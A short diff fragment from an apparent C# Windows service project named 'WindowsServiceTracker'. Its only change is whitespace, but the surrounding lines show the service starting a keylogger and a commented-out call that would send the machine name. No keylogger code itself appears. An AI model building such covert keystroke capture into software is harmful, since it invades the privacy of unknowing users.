@@ -68,7 +68,7 @@ namespace WindowsServiceTracker
             startKeyLogger();
             
             //SendStringMsg(Environment.MachineName);
-
+            
         }
 
         protected override void OnStop()
